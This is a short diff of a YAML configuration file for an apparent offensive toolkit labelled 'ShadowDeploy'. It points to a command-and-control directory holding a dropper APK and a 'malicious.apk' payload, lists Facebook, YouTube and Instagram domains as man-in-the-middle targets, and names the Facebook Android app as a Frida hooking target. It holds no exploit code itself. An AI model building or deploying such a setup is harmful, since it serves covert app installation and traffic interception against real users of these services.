@@ -1,9 +1,15 @@
+# Configuración Global ShadowDeploy
 server:
   host: "0.0.0.0"
   port: 8080
+
 android:
   package: "com.pentest.dropper"
-  dropper: "payloads/dropper.apk"
-  payload: "payloads/malicious.apk"
+  dropper: "3_c2_server/payloads/dropper.apk"
+  payload: "3_c2_server/payloads/malicious.apk"
+
 mitm:
-  target_domains: ["facebook.com", "youtube.com", "instagram.com"]
+  targets: ["facebook.com", "youtube.com", "instagram.com", "fbcdn.net"]
+
+frida:
+  target_app: "com.facebook.katana"
